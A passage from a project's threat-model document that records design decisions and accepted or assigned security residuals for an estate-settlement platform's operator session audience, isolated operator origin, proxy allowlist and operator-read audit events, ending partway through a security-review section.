  was going to exercise this already happened, the `operator` audience exists, and
  the SDL→payload direction is still unfenced. This is not an operator-platform
  item — two copies of one vocabulary with nothing comparing them is M43's stated
  general form, and M43 is where the derivation belongs.
- **[OWNER: M46]** *An allowlist row has no expiry.* A live row grants authority
  forever. **SPLIT FROM ONE BULLET BY M40 PR2** (§6fff): the bullet named THREE
  properties and, IN ITS OWN PROSE, handed two of them to owners its tag did not
  name — "session binding is PR3's audience; expiry and just-in-time elevation
  are **E1**" — while the third, case scoping, got no owner at all. One tag
  cannot dispose of three items, and this one matched none of the arguments
  underneath it. (An earlier draft of this note said "three different owners".
  The prose names TWO; the unowned third is the worse half, because an item with
  no owner inside a bullet whose tag is wrong is invisible from both ends.) **AND THE E1 HALF OF
  THAT PROSE IS WRONG FOR EXPIRY**, by the same merits test this PR applies to peer
  approval at §6b — 3,600 lines earlier in this document, not "one section over"
  as an earlier draft had it, and applied there to docs/04's SCOPE statement
  rather than to an E1 TAG, because peer approval's bullets were tagged
  `[OWNER: M21]` and never E1: `settlement_operators` (settlement
  migration 001) is `id, user_id, granted_by, created_at, revoked_at`, and
  membership is the predicate `revoked_at IS NULL` in `operators.repo.ts`. Expiry
  is one more column and one more conjunct in that predicate, inside settlement's
  own cluster, needing no IAM at all. Just-in-time elevation — which the original
  sentence bundled with it, and which is the reason the pair read as E1 — genuinely
  does need the IAM, stays **E1**, and now has its own bullet at §6b.
- **[OWNER: M46]** *An allowlist row has no case scoping.* Any live row grants
  authority over EVERY case. This is not a defect in the gate — `OperatorGate`
  faithfully answers the question the table can answer, and its own docstring says
  it "deliberately does not" decide anything about a case — but a property of the
  interim allowlist M7 shipped as the stand-in for the operator platform. Case
  scoping is what separation of duties needs beyond the row-local DDL CHECKs
  (reviewer ≠ reporter, requester ≠ approver). **RE-OWNED FROM M21 BY M40 PR2**
  (§6fff): it is the operator authorization model, which is M46.
- **[OWNER: M46]** *An allowlist row has no session binding.* Authority is still
  exercisable from any session the holder has. The original bullet said "session
  binding is PR3's audience" and PR3a shipped that audience, which an earlier
  draft of this PR read as the binding — but `AllowSessionAudiences` prepends
  `account` unconditionally and `CallerGuard` unions rather than replaces, so a
  decorated route admits `account` OR `operator` and every ordinary session
  still reaches it. **RE-OWNED FROM M21 BY M40 PR2** (§6fff), on the same
  evidence as §6z's ordinary-session bullet; the two are one claim recorded in
  two sections, and BOTH are still open.
- **[OWNER: M46]** *The gate answers a question about a PERSON and every caller
  then asks it about an ACTION.* There is one operator role and it carries every
  operator verb: approve a death case, lock an account, decide a stage of access
  to a dead person's estate, approve a distribution. Nothing in the interim
  allowlist can express "may review, may not approve distributions". A real role
  vocabulary is the operator platform's, and the gate is the seam it would go
  behind. **RE-OWNED FROM M21 BY M40 PR2** (§6fff): that platform is M46, and a
  role vocabulary is the first thing it owes.


## 6bb. Threat-model delta — M21 PR3a, the operator boundary (2026-08-18)

**A fourth session audience, a role-blind mint, and a second isolated origin —
with deliberately nothing behind it.** PR3a ships the BOUNDARY that TB7's
"operator authentication" line has described as absent since the threat model was
written, and PR3b ships the surface. The split is not administrative: an audience
is worth exactly what the services that refuse it make it worth, so the boundary
is reviewable on its own and the screens are reviewable on their own — the M15
PR1→PR2 precedent, where the vault origin proved its boundary before any key
material stood behind it.

### The three decisions, and what each one is not

- **An audience is a RESTRICTION, never a claim about its holder.** `operator`
  says only *this credential may be spent in fewer places than an ordinary
  session*. It does not say the holder is an operator, and nothing anywhere reads
  it as though it did: `OperatorGate` against `settlement_operators` remains the
  one answer to "may this person act", exactly as §6aa left it. That is what
  makes a ROLE-BLIND mint correct rather than a gap. Identity holds no settlement
  credential, there is no dblink between the auth and core clusters, and identity
  has no concept of a role — so a mint that tried to check would need a new trust
  edge to answer a question the audience is not asking. What an operator gets by
  minting one is a credential worth LESS than the account session they already
  held.

- **The route is the selector, not a field.** There are two mint routes —
  `POST /v1/auth/handoff` and `POST /v1/auth/handoff/operator` — rather than one
  taking an `audience` in its body. Nothing on the wire names an audience, so
  there is no field for a caller to set, no parameter for a schema to widen by
  accident, and the two ceremonies are separately guarded and separately audited.
  Redemption is deliberately audience-BLIND: one route, one response shape, and
  the audience travels on the `auth_handoffs` row that only the mint could
  write. The alternative — a single mint taking `{audience}` — was rejected on
  M16 PR1's finding that `HandoffService.mint`'s audience parameter was typed as
  the full union while only a DDL CHECK stopped it, and that parameter was
  deleted rather than narrowed for exactly this reason.

- **A SECOND isolated origin, not a second path on the first.** `operator.localhost`
  is a different HOST from `vault.localhost` and from the app, because cookie
  scope ignores the port — the fact M15 measured in a real browser before the
  vault origin relied on it. The two origins carry different `__Host-` cookie
  names, and neither is sent to the other by the browser. Reusing the vault
  origin was rejected outright: it would put an operator credential in reach of
  the code holding Zone A key material, and Zone A's whole argument is that its
  origin has a framework-free client and nothing else on it.

### What PR3a changes

- **`SESSION_AUDIENCES` gains `operator`**, closed in the TypeScript union and in
  `auth_handoffs`' CHECK, which migration `012_operator_audience.sql` WIDENS
  (`IN ('vault', 'operator')`) rather than rewriting — the shape the audience
  fence parses.
- **`AUDIENCE_ADMITTERS.operator` is EMPTY** and
  `AUDIENCE_ROUTE_ADMITTERS.operator` names three identity handlers: `session`
  (introspection must admit every audience or no isolated origin can exist),
  `stepUp` (an origin must be able to re-prove a factor without a round trip back
  across the boundary — the M15 PR4 lesson, where a free step-up on redemption
  let a stolen handoff code crypto-shred a vault), and `logout` (revoking your own
  credential can only reduce authority). `handoff` and `handoff/operator` are
  deliberately absent, so a leaked operator code cannot chain itself forward in
  either direction.
- **`apps/operator-web`** is the origin: framework-free, zero dependency tree in
  the browser, `default-src 'none'` / `script-src 'self'` with no `unsafe-*` in
  ANY environment, `require-trusted-types-for 'script'` with `trusted-types
  'none'`, and — stricter than the MAIN APP, which needs `data:` for M12's
  document viewer — no `data:` in `img-src`, because nothing here renders an
  inline image. It is IDENTICAL to the vault origin's policy, not stricter than
  it; the first draft of this paragraph claimed otherwise and measurement
  refuted it. What now gates the relation is a live comparison of the two
  origins' headers in the stack e2e, directive by directive, so the second
  isolated origin cannot drift weaker than the first. It holds NO credential in either
  direction, asserted three ways: a source fence, a runtime assertion that its
  config's credential holding is both equal to the granted set and explicitly
  empty, and a compose-parity assertion over its deployment block.
- **The proxy is an exact-match allowlist of three identity routes.** A proxy
  that forwards whatever path it is handed while carrying a live bearer is an
  SSRF primitive; and `startsWith` is not enough, because
  `/api/auth/logout` is a prefix of identity's unauthenticated
  `/v1/auth/logout/refresh`.
- **`route-consumers.spec.ts` learned about a second edge.** Its
  `deriveEdgeRewrites()` read one file, so a second edge would have contributed
  ZERO rewrites and this origin's `/api/…` literals would have resolved through
  the vault's table by coincidence — a fence whose input is narrower than its
  claim, going green for the same reason it is wrong (§6y). It now walks a
  declared `EDGE_SERVERS` list, matches both table shapes, and carries a PER-EDGE
  anti-vacuity floor.

### Residuals

- **[ACCEPTED]** *The origin does not re-check the audience of the session it
  redeems.* It could not usefully: the redeem response deliberately does not
  carry one, and a second copy of an audience decision at an edge is a second
  copy free to drift from the callees that enforce it in both directions (vault
  refuses `operator`, settlement will refuse `vault`). What makes this safe is
  that the browser client DISPLAYS the audience it reads back from
  `/api/auth/session`, so a session of the wrong kind is visible rather than
  silently tolerated.
- **[ACCEPTED]** *A stolen mint code is worth an operator-audience session for
  60 seconds.* Identical to the vault handoff's exposure and bounded the same
  way: burned on the ATTEMPT so a race is winner-takes-all, one access token
  with no refresh token in existence, and — the part specific to this audience —
  a session that today reaches nothing but identity's three routes. Script on the
  app origin can read the code out of the hidden field it is posted in, which is
  why the app origin's own CSP weakness (M11: `script-src` is not locked down,
  because Next's inline bootstrap needs nonces) bounds this rather than the
  operator origin's strength.
- **[CLOSED: §6cc]** *Settlement emits no read event of any kind — PR3b.* All 23
  of its audit actions were writes, so an operator opening a case, reading its
  timeline or working the queue left no trace of the read. PR3b's first slice
  adds them, in the same change as the screens that make the reads — adding them
  earlier would have been a routeless event, which is the zero-callers shape this
  milestone exists to close. The TB7 paragraph claiming these events already
  existed was corrected in the same PR that found it false.
- **[OWNER: M46]** *Operator READS are bounded, counted and reviewed by nothing.*
  **RE-OWNED FROM M23 AND REWRITTEN BY M40 PR3** (§6ggg), because two of this
  bullet's four clauses died the day after it was written and its own
  justification is dead with them. It read "there is no rate limit on any
  operator verb… because a bound whose only caller is a surface that does not
  exist is a control nobody exercises". **THE SURFACE EXISTS** — `operator-web`
  proxies fourteen settlement routes — and **M22 PR1 SHIPPED A BOUND ANYWAY**
  (`a7eb15b`, §6ii): an append-only operator action ledger with a derived
  coverage fence, a twelve-distinct-case ceiling over a one-hour window, and
  proof by execution that `settlement.operator.breadth_exceeded` fires. The
  write half is therefore §6ii's, cross-cited rather than restated here, because
  a second copy is a copy that drifts. **WHAT SURVIVES IS THE READ HALF, AND IT
  IS UNTOUCHED**: the ledger records ACTIONS, its own `EXEMPT` map declares the
  two worklist reads out ("READ. The worklist emits its own `worklist.viewed`;
  breadth is about acting on estates, not about seeing which need acting on"),
  and the case reads reach the gate but are never COUNTED by it —
  `assertCaseVisible` consults `this.gate.is` unconditionally and up front, as
  its own docstring says, and then records nothing; an earlier draft of this
  bullet said they "never reach the gate at all", which is false. The reads
  themselves ARE
  recorded — `settlement.queue.viewed`, `settlement.case.viewed` and
  `settlement.distribution.amount_viewed` are all in `AUDIT_ACTIONS`. TWO OF THE
  THREE are the trail M21 PR3b shipped; `amount_viewed` was added by M23 PR4b
  (`4e125e1`), the same PR that spent §6dd's deferral, so the money route gained a
  READ event and no WRITE event in one change. So what is missing is not the
  record but the BOUND and the REVIEW. An operator may read every estate on the platform, each
  read landing in a trail nothing bounds and nobody reads back. That is M46's — its scope names allowlist case scoping, and
  case scoping is the control that makes reading an unrelated estate an
  exception instead of routine. Recorded once more from the audit side at §6cc,
  which is the same gap and the same owner. **NOTE ALSO** that the bound WARNS
  and never refuses, deliberately (§6ii); "unbounded" stays literally true of
  refusal, and that question is §6ii's `[ACCEPTED]` ceiling bullet, not this
  one's.
- **[ACCEPTED]** *The operator interstitial is reachable only by typing
  its URL.* `/operator` is deliberately not in the app's navigation: minting is
  role-blind, so the page works for everybody, and a product for 10M users should
  not put "open the operator console" in an estate's own navigation.
  **ACCEPTED BY M40 PR3** (§6ggg). The old closing sentence — "how an operator
  finds it is a question with a real answer only once there is something behind
  it" — promised a re-decision that has since silently come and gone: the console
  shipped in M21 PR3b and M23, the condition was met, and nobody re-decided
  because nothing was watching for it. **A DEFERRAL WHOSE TRIGGER IS AN EVENT
  NOBODY OBSERVES IS A DEFERRAL WITH NO OWNER**, which is this milestone's
  subject in miniature. Re-decided here, and the answer is unchanged, because
  minting is still role-blind: a nav entry would show an operator-console link
  to every signed-in account — a discoverability cost paid by ten million people
  to save a handful of operators one bookmark. The absence is held by a
  mechanism rather than by this prose (`page.test.tsx` asserts `AppNav`'s seven
  href-bearing items with an anti-vacuity floor). If M46's real operator role
  vocabulary ever lands, a role-gated entry becomes POSSIBLE — a consequence of
  M46, not an item M46 owes, said here so the next sweep does not re-open it.
- **[OWNER: E1]** *An operator-audience session is still a 15-minute credential
  with no expiry policy of its own, and no way for an operator's employer to
  revoke it centrally.* Just-in-time elevation and session recording both need
  the IAM the deployment does not have, exactly as TB7's deferral list records.


## 6cc. Threat-model delta — M21 PR3b, the operator screens (2026-08-19)

**The surface behind the boundary, and the first read events settlement has ever
emitted.** PR3a shipped an audience, a role-blind mint and an isolated origin
with deliberately nothing on it. PR3b puts the review queue, the post-verification
worklist and the case surface there, wires thirteen settlement routes through the
edge, and gives an operator's READS a trail of their own. (Thirteen is correct
FOR PR3B and stays: `PROXY_ROUTES` carried thirteen `settlement` rows at
`9101c12`. It carries FOURTEEN today, because M23 PR4b added the
distribution-amount route. M40 PR3 first "corrected" this sentence to fourteen,
which made a true statement about PR3b false — a count in a delta section
describes the PR that section records, and updating it to today's tree is the
opposite of repair.)

### What PR3b changes

- **Thirteen settlement handlers gain `@AllowSessionAudiences('operator')`**, per
  handler and never service-wide. `CallerGuard.audiencesFor` returns a UNION that
  widens and can never narrow, so a service-wide grant would hand an operator
  session every route settlement declares — including the owner-facing intake and
  void routes. The set is derived and asserted in
  `apps/services/settlement/test/session-audience.spec.ts`, in both directions.
- **The edge gains a second upstream and a table with a METHOD in every row.**
  `GET cases/:caseId/stages` is the operator's list; `POST` on the same path is
  the EXECUTOR's stage request, which the console does not carry and the audience
  does not admit. A path-keyed allowlist could not express that difference, so
  the row is `(method, path, upstream, rewriteTo)` and the upstream path is BUILT
  from the template rather than produced by surgery on what arrived. The query
  string is dropped: a settlement path already names a case, and a query string
  is the part intermediaries log by default (the M12 document-search rule).
- **Every operator read is audited**, and until PR3b all 23 of settlement's
  audit actions were writes. TWO actions rather than six: loading one case opens
  four reads (the case, its timeline, its stages, its distributions), so one
  action per route would be four events per screen — noisier without being more
  informative — and the route travels in `detail.surface`.
  `settlement.queue.viewed` is cross-case reconnaissance with no resource id;
  `settlement.case.viewed` names exactly one estate and belongs on that case's
  own trail. They answer different questions, which is why they are two.
  *(SUPERSEDED IN PART BY M48 PR2, §6iii: both actions now carry every reader,
  not operators alone, with `actorType` derived from the gate. "Operator read"
  above should be read as "console read" — what changed is who else appears on
  these actions, not what the console's own rows mean.)*
- **The console does NOT poll**, and the reason is that trail rather than the
  network. Each case read is an audit event on a dead person's estate, so a
  console that refreshed itself would turn one screen, abandoned over lunch, into
  hundreds of recorded reads — the audited-volume-is-a-UI-constraint rule M12
  applied to document decrypts, arriving where the subject is a settlement case.
  A case is re-read when somebody acts on it, and a stack test opens a case,
  counts exactly four reads, and then waits.
- **The step-up ceremony POLLS.** Identity grants the elevation; settlement
  learns of it by introspecting the token through `HttpSessionVerifier`'s
  short-TTL positive cache, so for up to one TTL a peer still answers from a
  cached un-elevated session and a single-shot retry leaves the prompt doing
  nothing (the M13 review's finding against the main app). Cancel ABORTS the
  loop, and the ownership marker is a counter rather than a boolean, because
  Cancel restores the form and a second attempt can begin while the first is in
  flight. The stakes here are a death case: a retry surviving Cancel could
  confirm a verification, which locks a living person's account and revokes every
  session they hold.
- **The PR3a claim that an operator credential "reaches none of your estate" is
  REPLACED, in the change that made it false** — on the console's own screen and
  in the app's paired-devices list, with a test asserting the absolute is gone
  rather than merely that the new words are present.

### Residuals

- **[ACCEPTED]** *An operator console session can see a case its holder is party
  to.* THREE of the thirteen routes reach a case through `assertCaseVisible` —
  `listStages`, `listDistributions` and `timeline` — and that predicate admits the
  DECEDENT, the REPORTER and the estate's EXECUTOR as well as an operator —
  deliberately, because those are the people a case is about and the alternative
  is three routes with two authorization models. **CORRECTED FROM "FOUR" BY M40
  PR3** (§6ggg): the service has a fourth caller, `listTasks`, and it is not one
  of the thirteen — `cases/:caseId/tasks` carries no
  `@AllowSessionAudiences('operator')` and has no `PROXY_ROUTES` entry, so no
  console session reaches it. Unlike the "thirteen" beside it, this number was
  never right: counting call sites in the SERVICE answered a question about the
  EDGE. Today it is four of fourteen, both moved by the same M23 PR4b that spent
  the §6dd deferral. So a
  console session really can read a case the holder reported, or is executor of.
  It is accepted rather than closed for three reasons: the credential reaches
  nothing the holder's ORDINARY account session could not already reach through
  the same routes, so no authority is gained; narrowing `assertCaseVisible` for
  the operator audience would put a second copy of a §5.1 visibility rule in the
  code path, which is how two answers start to disagree; and the honest fix is
  the audience copy, which now states a RESTRICTION ("it cannot reach your
  assets, documents, people or vault") rather than an absolute the platform does
  not keep.
- **[ACCEPTED]** *A console session's reads are indistinguishable, in the audit
  trail, from an operator's legitimate work.* The read events carry the actor and
  the case and nothing about WHY, because settlement has no concept of an
  assignment or a ticket. Reading a case one is party to therefore looks exactly
  like reading it as an operator. What bounds it is that the events EXIST at all
  — before PR3b there was nothing to correlate — and the correlation an
  investigator would run (an operator reading cases they are also the reporter
  of) is answerable from the case rows already recorded.
- **[ACCEPTED]** *Withdrawing consent cannot recall an action already on the
  wire.* The step-up prompt aborts on Cancel, on a fresh attempt, and on the
  parent discarding it (a PR3b review finding: before it, "Back to worklists"
  mid-poll closed the case two seconds later). What aborting stops is the LOOP —
  no further attempt is issued and no result is acted on — and it cannot reach a
  request already issued, whose transaction may commit at settlement while the
  client has stopped observing it. Bounded to at most one action, and to one the
  operator consented to by submitting a code; the window is the ~100ms of a
  retry in flight. Closing it means making the outcome conditional on something
  the client can still withdraw, which is a settlement change rather than a
  browser one, for a case where consent was given and then reconsidered inside a
  tenth of a second.
- **[ACCEPTED]** *The case id lives in module state and not in the URL.* A refresh
  returns to the worklists, which is a real cost paid deliberately: a hash route
  would accumulate death-case references in an operator's browser history and put
  one in the address bar, which is the part a screen-share or a screenshot
  catches.
- **[ACCEPTED]** *A stale console screen can offer a verb the case no longer
  admits.* The console reads a case, renders the verbs its status allows, and
  does not re-read until somebody acts — so a case another operator advanced in
  the meantime is refused by settlement's own transition table with
  `invalid_transition`, which the screen reports as "this case has moved on;
  reload it". **ACCEPTED BY M40 PR3** (§6ggg): the safety property is enforced
  where it belongs, against a LOCKED row, so a stale screen can never actually
  advance a case it no longer admits. This is a UX cost, not a control gap, and
  the console already makes the cost honest — it separates `STATE_CHANGED` from
  `CONFLICT` and from `UNAVAILABLE`, so two failures with different remedies do
  not share a token. **THE COST THE OLD SENTENCE OMITTED**: a step-up elevation
  is SPENT before the refusal is met, so the operator pays a ceremony for an
  action that was never going to land. Stated rather than fixed. The old closure
  named a change feed, which is realtime TRANSPORT and not authorization — M46
  covers none of it, and stretching an authorization row to hold a transport
  item would dilute the row M40 PR2 created to make an owner real.
- **[OWNER: M46]** *There is no second-person review of an operator's own reads.*
  Separation of duties exists at the ROW — reviewer ≠ reporter, approver ≠
  requester, approver ≠ recorder, three relations carried by four DDL CHECKs —
  and nothing anywhere reviews who READ what. **RE-OWNED FROM M23 BY M40 PR3**
  (§6ggg): M23 is `**COMPLETE.**` and this is the operator authorization model,
  which is M46. Its scope already names the two things this needs and needs no
  widening — a real operator role vocabulary (to say who may review whom) and
  allowlist case scoping (to make a read of an unrelated estate an exception
  rather than routine, which is what makes the read events settlement now emits
  reviewable at all). **THE SAME GAP IS RECORDED AT §6bb FROM THE BOUND SIDE**,
  and both are M46: one asks what counts an operator's reads, this one asks what
  reviews them. **ONE CORRECTION**: the old sentence compared itself to TB7's
  session-recording deferral, which is **E1** and stays E1 — a comparison, not
  an owner, and reading it as one is how an item inherits a neighbour's
  blockers.


## 6dd. Threat-model delta — M21 PR4, the security review (2026-08-19)

Seven file-scoped discovery lenses over the milestone's own files (never a diff
range), each in its own worktree detached at `9101c12`, then two adversarial
verifiers per deduped candidate on different angles — reachability in a real
production configuration, and is-it-already-a-documented-decision — both told to
default to refuted. Every confirmed finding was re-proved by execution before a
line changed, and every fix mutation-tested from a pristine copy with a positive
control beside it.

FIFTEENTH milestone running where every confirmed finding sits in machinery the
milestone introduced — with ONE exception, which is the most useful thing the
review produced and is recorded below as the launcher consent defect.

**What the verifiers killed, and why that is the point.** Four candidates were
REFUTED on reachability and they are worth naming, because a review that reports
them as findings teaches people to skim it. Retargeting a proxy row's upstream is
caught by `route-consumers.spec.ts`, which derives the edge's rewrites from
`server.ts` itself. `setDistributionStatus` really does leave two of three
transitions unaudited and really does admit `disputed` from `completed` — and has
no product consumer, no BFF client and no edge route, so nothing can reach it.
`evidenceReadAuthority`'s docstring does NOT falsely claim to audit; it says the
read is audited on the documents side, which is true. And the bearer-header fence
matches one spelling of several, which a developer could evade and a request
cannot.

**The one defect older than the milestone.** `StepUpPrompt` checks its ownership
counter AROUND `onElevated()`, never inside it — and both handoff launchers do
their entire side effect inside that call: mint the code, set the form action,
write the code into the field, navigate. So Cancel pressed while the retry's mint
was in flight arrived after the browser had already been sent to the isolated
origin with a live code. Measured, with the mint held open by a promise the test
releases: nothing submitted at the moment of cancel, submitted immediately after.
This is NOT §6cc's accepted residual, which is a different app and is about a
request already on the wire; here the harmful step is client code running after
the response arrives, with the withdrawal already recorded, so it was closable
and is closed. `StepUpPrompt`'s claim that an action can never proceed after
consent is withdrawn has been narrowed to what it can enforce, with the caller's
obligation stated next to it.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** *A blocked handoff POST is detected, not prevented.* The app's
  `form-action` is baked at build time and the BFF serves the origin at request
  time, and nothing outside the compose stack forces them to agree — the parity
  spec compares two literals against one constant, and the image probe proves the
  value arrives rather than that it matches. PR4 converts the silent failure into
  a reported one and clears the code from the DOM, which is what the client can
  do about it. Making the two agree is a deployment-configuration property, not a
  browser one.
- **[OWNER: M26]** *Two of three distribution status transitions emit no audit
  event, and `disputed` is reachable from `completed`.* An unlogged undo of a
  completed distribution, callable by an executor as well as an operator.
  **RE-OWNED FROM M23 BY M40 PR3** (§6ggg), and this is the one residual of the
  thirteen whose RISK CHANGED rather than its owner. It was deferred with an
  explicit precondition — "left as found because the route has no consumer
  anywhere, no BFF client, and the operator edge's exact-match allowlist does
  not carry it" — and **M23 PR4b (`4e125e1`, #141) BUILT EXACTLY THAT CONSUMER
  WITHOUT ADDING THE EMIT**: a BFF client method, the `setEstateDistributionStatus`
  mutation, a three-member SDL enum, and an executor button reading "Raise a
  dispute" on a paid-out row. **A DEFERRAL'S PRECONDITION CAN BE SPENT BY A
  LATER PR, and nothing was watching** — the same unobserved-trigger shape as
  §6bb's interstitial, in the same sweep, with a control consequence instead of a
  UX one. FOR THIS INSTANCE the spender is a different milestone: §6dd is M21
  PR4's delta, so M21 wrote the condition and M23 PR4b spent it. THAT IS NOT THE
  GENERAL RULE, and an M40 PR3 draft briefly made it one by asserting every
  instance crosses a milestone boundary. §6bb's interstitial does not — M21 PR3a
  deferred it and M21 PR3b shipped the console that met it — while §6bb's bound
  was spent by M22 PR1, which does. Two of three cross, so the milestone is not
  what the shape is about; the trigger being an event nobody observes is. MEASURED at `01fdf90`:
  `setDistributionStatus` accepts three targets and emits on exactly one
  (`to === 'completed'`); `AUDIT_ACTIONS` carries four distribution actions and
  none for `in_progress` or `disputed`; and the `from` list for `disputed` is
  `['approved','in_progress','completed']`, so the completed→disputed edge is
  real rather than theoretical. Counted as EDGES rather than targets it is four
  of five unaudited, which the bullet's own phrasing hides. M26 owns forensic
  audit completeness, and a shipped step-up-gated write verb that emits nothing
  is that. **THE ROW HAS A NAME COLLISION AND THIS TAG PICKS A SIDE**, which
  docs/04's M26 row already demands: of the thirteen `[OWNER: M26]` tags that
  existed before this one was added — not the four that precede it in the file —
  only four are audit-completeness items (§6j, §6k, §6p, §6q); NINE are M25's
  erasure fan-out at §§6kk–6pp, which is a different body of work
  wearing the same name. This tag belongs to the audit-completeness four. **NOT FIXED HERE, DELIBERATELY**: M40 is an adjudication milestone, the
  fix touches the closed `AUDIT_ACTIONS` vocabulary, and a new action must reach
  the audit consumer before its producer.
- **[OWNER: M45]** *The bearer-header fence's corpus is narrower than its claim.*
  **RE-OWNED FROM M23 AND RENAMED BY M40 PR3** (§6ggg): "matches one spelling"
  undercounts its own subject. There are THREE assertions with three different
  patterns — an identifier match on `bearerFrom`, and two regex matches on
  `headers['authorization']` — and the defect is not their number but their
  REACH: **two of the three read `server.ts` alone while the test's title claims
  a property of the whole edge.** That is M45's stated scope exactly. The second
  axis is the matcher itself: `bearerFrom` is an identifier a caller chose, so a
  rename walks past it — the named-anchor defect this repo already names, "anchor
  a fence on what the runtime reads, not on an identifier a caller chose". No
  bearer read path exists on the edge today, so evading it still requires writing
  the bypass rather than sending a request; that bound rests on a FACT ABOUT
  TODAY'S TREE rather than on a mechanism, which is why this is deferred work and
  not an `[ACCEPTED]` decision.
- **[OWNER: M45]** *The egress fence's sink vocabulary is hand-listed, in three
  copies.* It asserts one module may reach the network and lists seven strings —
  `fetch`, `XMLHttpRequest`, `sendBeacon`, WebSocket, EventSource, service worker
  and `new Image`; it does not list `window.open`, `location.href =`,
  `location.assign` or `form.submit`. **RE-OWNED FROM M23 AND WIDENED BY M40 PR3**
  (§6ggg): the old title said "the console's", and there are **THREE identical
  copies** of that list — operator console, vault origin and the extension — so
  the bullet described one member of its own category, which is the half-applied
  rule this repo names. The claim is "%s makes no network call" and the input is
  seven hand-written strings, so the fence goes green for the same reason it is
  wrong. The declarative half is covered by a no-navigating-attribute assertion
  IN ONE COPY OF THE THREE — only `apps/operator-web/test/fences.spec.ts` pins
  `setAttribute('href')` to a single site and refuses `setAttribute('on…')`;
  `vault-web` and the extension have a `fences.spec.ts` each and neither asserts
  it. **CORRECTED BY THE SECOND REVIEW PASS**: a first draft said the vault origin
  leaned on a `dom.ts` comment "and the extension on neither", and BOTH halves
  were wrong. All three DECLARE the absence in a comment, but not the same
  comment, and a second draft got that wrong too. The operator and vault origins
  share one BYTE-IDENTICAL line — "Attributes that may be set through `el`.
  Deliberately not `href`/`src`." at `operator-web/src/client/dom.ts:26` and
  `vault-web/src/client/dom.ts:24`, each beside an `Attrs` interface. The
  extension has no `Attrs` interface and no copy of that line; its comment is
  FOUR lines in the module docblock at `vault-extension/src/dom.ts:11`,
  differently worded — "Deliberately no `href` or `src` helper. Either is an
  outbound GET, which would be a second egress path alongside `api.ts`" — and it
  is the only one of the three that says WHY. So the drift the bullet is about
  runs through the comments as well: two origins copied, one wrote its own.
  Ranking the copies by which one I had read most recently is how a bullet about
  a half-applied rule came to apply itself to two of three — and then, in the
  correction, to quote a string from two files while attributing it to three. What is true is the asymmetry that
  matters: the comment is everywhere and the ASSERTION is in one place, so the
  sibling an earlier draft offered as cover is itself the half-applied rule. This sits on M45's seam with M43 — M45's row says "the two rows meet
  where a fence scans a vocabulary" — and lands on M45 because the defect is the
  SCAN's stated reach rather than a vocabulary lacking a mirror. **THE FIX IS NOT
  A UNIFORM EDIT**, which is why it needs an owner rather than a sweep: extending
  the list is free on the console and the extension, and needs an allowlist
  decision on the vault origin, where two existing call sites would go red.
- **[ACCEPTED]** *The isolated edges answer 500 rather than 400 on a malformed
  `Host`.* **SPLIT FROM ONE BULLET BY M40 PR3** (§6ggg) and **RE-SCOPED**: the
  bullet said "operator-edge", and this shape is on `vault-web` too — three
  shapes across two origins is SIX instances, and the old bullet enumerated half
  its own population, which is the half-applied rule this repo names. Accepted on
  its bounds, and the bound is the RESPONSE rather than the reachability: the 500
  carries no upstream body and no stack trace, so it discloses nothing a 400
  would not. **AN EARLIER DRAFT SAID "no path reaches it from a request a client
  can send", WHICH IS WRONG** — Node passes a malformed `Host` straight to the
  handler and neither edge validates it before `new URL`, so anyone who can open
  a socket reaches it with one request. The cost is a status code on a reachable
  path, not a disclosure, which is still an acceptance and not a defence.
- **[ACCEPTED]** *`config.secureCookies` is asserted by a test and read by
  nothing.* **SPLIT FROM ONE BULLET BY M40 PR3** (§6ggg). The risk a reader
  imagines here — that a cookie ships without `Secure` because a flag went
  unread — DOES NOT EXIST: the attributes are hardcoded at the cookie writer, and
  dropping `Secure` there turns three NAMED assertions red, while flipping the
  unread flag turns exactly one red (its own literal check). Both edges are the
  same: five `secureCookies` lines on the operator origin and four on the vault
  origin, with ZERO `src` reads outside `config.ts` in either. **THE RULE IS
  WORTH MORE THAN THE DEBT**, so it is recorded instead: a config value nothing
  reads is a value whose test proves only that the value exists. Kept because
  removing it is a change to two edges' schemas for no behaviour, and stated so
  the next reader does not re-file it.
- **[OWNER: M47]** *`APP_ORIGIN` is validated as a URL rather than as an origin,
  on BOTH isolated edges.* `z.string().url().optional()` — `config.ts` on the
  operator edge and on the vault edge carry the identical line — so a value with
  a path, a query, credentials or a `javascript:` scheme is accepted and
  serialised to the client — where the operator edge puts it in an `href` via
  `setAttribute` and the vault edge passes it to `location.assign`. ONE SINK
  EACH, and DIFFERENT ONES: the pair has drifted even in how it consumes the
  same value, which is the argument for M47 rather than an aside.
  **SPLIT FROM ONE BULLET AND RE-OWNED BY M40 PR3** (§6ggg) to M47, the row this
  PR opens. The old sentence said "a value carrying a path is accepted", which
  describes the LEAST of what `.url()` admits. The fix is one `.refine` per edge. **AND NO PART OF THIS REPO HAS MADE THAT
  DECISION YET**, which an earlier draft of this bullet asserted of the BFF and
  which is false: `apps/bff/src/config.ts` uses the same `z.string().url()` for
  its browser-facing origins and contains not one `.refine`; its only extra step
  is stripping a trailing slash. So this is not a second spelling of a settled
  behaviour — it is a decision nobody has taken anywhere, which is a better
  reason for the row than the one it replaces. Not M45 — a zod schema is not a
  scan and has no corpus to declare.
- **[OWNER: M45]** *Three services of ten have a service-local audience spec,
  and the shared fence's anti-vacuity is a FLOOR where it should be a SET.*
  Identity, settlement and vault have one; the other SEVEN rely on the shared
  source fence alone. **RE-OWNED FROM M23, RENUMBERED AND SPLIT BY M40 PR3**
  (§6ggg): the old sentence said "three of NINE", leaving six — but the shared
  fence derives its own corpus from `apps/services/*/src/config.ts` and that is
  TEN directories, `audit` included, so the remainder is seven. Its floor reads
  `expect(services.length).toBeGreaterThan(5)` against a derived ten, which is
  the defect this repo names twice over: an anti-vacuity floor belongs at every
  LEVEL of a scan, and where a scan has a reach it must compare SETS, because
  mis-attribution preserves counts. Squarely M45's — the bullet's own closing
  sentence already pointed at §6y, one of the two items M45's row was created to
  take.
- **[OWNER: M45]** *The vault sweeps measure ONE audience on a surface that
  admits two.* Vault's own sweeps filter on `extension`. Of its twenty-eight
  routes, twelve are covered anyway by a named assertion that pins EVERY audience
  on the emergency-access controller, so the genuinely unmeasured set is the NINE
  non-extension routes of `VaultController` — not "the rest", which an earlier
  draft of this bullet said and which would have been twenty-one. The gap is real
  and a third the size claimed, on the very layer that exists to be un-evadable. Profile's per-route widening
  is measured only by a test that hardcodes `audience: 'account'`.
  **SPLIT FROM ONE BULLET BY M40 PR3** (§6ggg), **AND THE OLD SENTENCE WAS WRONG
  IN TWO PLACES**: it said profile has "no spec at all", which is false — what
